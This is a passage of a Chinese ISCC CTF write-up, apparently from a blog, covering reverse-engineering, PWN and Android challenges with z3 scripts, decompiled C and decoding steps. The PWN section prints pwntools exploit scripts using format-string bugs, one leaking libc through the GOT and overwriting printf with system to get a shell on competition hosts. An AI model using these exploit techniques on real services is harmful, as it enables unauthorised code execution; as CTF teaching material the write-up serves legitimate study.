s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">15</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">35</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">-</span> v16<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">-</span> v16<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0xDFD78083C</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">38</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> v16<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> v16<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">24</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x48E39C1B6</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">38</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">32</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">-</span> v16<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">-</span> v16<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x149942A1B3</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v16<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">41</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">-</span> v16<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">25</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x54FD4EE4A</span><span class="token punctuation">)</span>

v4<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span>sat<span class="token punctuation">)</span><span class="token punctuation">:</span>
     
     result<span class="token operator">=</span>s<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span>
     <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>v16<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
          v4<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span>v16<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
          <span class="token keyword">print</span><span class="token punctuation">(</span>v4<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
</code></pre>
<p>十六进制解个密<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/dda672d1b08e44479cf8e0934b331bff.png"/></p>
<h3><a id="_757"></a>解题收获</h3>
<p>简简单单解个小方程</p>
<h2><a id="Bobs_Code_759"></a>Bob’s Code</h2>
<p>初步查看main函数的小函数<br/> Str-&gt;v15-&gt;v13-&gt;v11-&gt;Str1-&gt;Str1=Str2<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/b8f88c322bc64a258ed590363ac6b320.png"/><br/> sub_4116E0()<br/> 先凯撒<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/6e479a90874448619b8a7b67d149c5c6.png"/><code>.U1ZorfEzdEVUazfmTVVve.gVDmTVnbEjSYTAwnU15mVdVmgt3TKrWrfjimD0.</code></p>
<p>sub_412D10()</p>
<pre><code class="prism language-cpp"><span class="token keyword">int</span> __cdecl <span class="token function">sub_412D10</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">char</span> a3<span class="token punctuation">,</span> <span class="token keyword">int</span> a4<span class="token punctuation">)</span>
<span class="token comment">//a3=46</span>
<span class="token comment">//a4=22</span>

<span class="token punctuation">{<!-- --></span>
  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [esp+D0h] [ebp-14h]</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+DCh] [ebp-8h]</span>

  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a2<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a4 <span class="token operator">+</span> a2<span class="token punctuation">)</span> <span class="token operator">=</span> a3<span class="token punctuation">;</span>		<span class="token comment">//这段看不懂</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> a4<span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>
  <span class="token punctuation">{<!-- --></span>
    result <span class="token operator">=</span> j <span class="token operator">+</span> a2<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>j <span class="token operator">+</span> a2<span class="token punctuation">)</span> <span class="token punctuation">)</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>j <span class="token operator">+</span> a2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>j <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//a2[j]=a1[j-1]</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>我的超人！<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2222c4b5da644db995410a7903778f92.png"/></p>
<p>sub_411389()<br/> 看下上面就好了，下面理论是base64</p>
<pre><code class="prism language-cpp"><span class="token comment">//a2=61</span>
<span class="token comment">//</span>
gned <span class="token keyword">int</span> __cdecl <span class="token function">sub_4127C0</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">,</span> <span class="token keyword">char</span> a4<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
  v16 <span class="token operator">=</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment">//v16=4*(63/3)=4*21</span>
  v15 <span class="token operator">=</span> a4 <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token number">46</span> <span class="token operator">:</span> <span class="token number">61</span><span class="token punctuation">;</span>		<span class="token comment">//62位长，数组下标61</span>
  Destination <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">j__memset</span><span class="token punctuation">(</span>v14<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x1FFu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">j__strcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Destination<span class="token punctuation">,</span> Source<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">//Destination=Source=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">19</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">{<!-- --></span>
    v12 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Destination <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Destination <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> Source<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    v14<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=</span> v12<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
</code></pre>
<h1><a id="PWN_816"></a>PWN</h1>
<h2><a id="create_id_817"></a>create_id</h2>
<h3><a id="_818"></a>解题步骤</h3>
<p>签到，利用格式化字符串任意地址写，需要修改的值题也给了，测一下偏移直接构建payload</p>
<h3><a id="_820"></a>详细描述</h3>
<p>from pwn import *<br/> p=remote(“123.57.69.206”,5320)<br/> p.recv(2)<br/> get_addr=int(p.recv(8),16)<br/> print(hex(get_addr))<br/> p.sendline(“1”)<br/> p.sendline(“1”)<br/> p.sendline(“1”)</p>
<p>payload=p32(get_addr)+“%5c%10$n”<br/> p.sendafter(“What’s your name?\n”,payload)<br/> p.interactive()</p>
<h3><a id="_833"></a>解题收获</h3>
<p>很基础的题。</p>
<h2><a id="sim_treasure_836"></a>sim_treasure</h2>
<h3><a id="_837"></a>解题步骤</h3>
<p>原题，ISCC2017 pwn200<br/> 格式化字符串漏洞</p>
<h3><a id="_840"></a>详细描述</h3>
<p>改大佬脚本<br/> from pwn import *<br/> r=remote(“123.57.69.203”,7010)<br/> elf = ELF(“./sp1”)<br/> libc = ELF(“./libc-2.27.so”)<br/> puts_got = elf.got[‘puts’]<br/> p.recvuntil(“Can you find the magic word?\n”)<br/> payload1 = p32(elf.got[“puts”])+ b"%6$s"<br/> p.sendline(payload1)<br/> p.recv(4)<br/> puts_addr = u32(p.recv(4))<br/> printf_got = elf.got[‘printf’]<br/> libc_base = puts_addr - libc.symbols[‘puts’]<br/> system_addr = libc_base + libc.symbols[‘system’]<br/> p.sendline(“A”)<br/> payload2 = fmtstr_payload(6, {printf_got:system_addr})<br/> p.recvuntil(“A”)<br/> p.sendline(payload2)<br/> p.interactive()</p>
<h3><a id="_860"></a>解题收获</h3>
<p>主要还是抄原题（bushi</p>
<h1><a id="Mobile_862"></a>Mobile</h1>
<h2><a id="Mobile1_863"></a>Mobile1</h2>
<h3><a id="_864"></a>解题步骤</h3>
<p>jadx反编译apk文件，在main函数里找到两个jformat、jlast两个函数，分别解密拼接后得到flag</p>
<h3><a id="_866"></a>具体描述</h3>
<p>查找main函数<br/> 一个jformat，一个jlast<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/f5d73d2dfa1e4f38955fb84111743677.png"/>jformat<br/> 将base64加密的<code>K@e2022%%y</code>作为key，加密的<code>I&amp;V2022***</code>作为IV进行AES-CBC加密，<br/> 结果为<code>R0ZacFlGeUNsT3Z5LzJuc0ltRHJhRTQrQS9TUDBxcjVxblMrL01iUHoxST0=</code>的base64解密<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/94f42fb76bb4476e987866971c1569af.png"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/91ec221155cc465c90a238f4d1e4c9b3.png"/></p>
<p>jlast<br/> 简单的字符串移位</p>
<pre><code class="prism language-python">a<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">'=Lr8ZoM=wQU3OtSxJNg6fR5N'</span><span class="token punctuation">)</span>
b<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> b<span class="token punctuation">:</span>
     <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>

</code></pre>
<p>得到一串字符串<br/> <code>f6O3Z8RgtUor5NSQMLNJxw==</code><br/> 然后base64解密后再md5解密<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/3393b9dd3b9a451b99a540f5c07c6aa2.png"/><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/08e85d045af84f15a4b66165c73b25fa.png"/></p>
<p>根据校验得<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/090351662aab451882143c12d492d025.png"/><br/> flag=<code>ISCC{jformat+jlast}</code><br/> flag=<code>ISCC{mb..o_jghgfTSAD_no}</code><br/> 还是那个丑的怀疑是否正确的flag</p>
<h3><a id="_896"></a>解题收获</h3>
<p>看清函数的加解密逻辑就好啦~</p>
</div>
<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css" rel="stylesheet"/>
<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css" rel="stylesheet"/>
</div>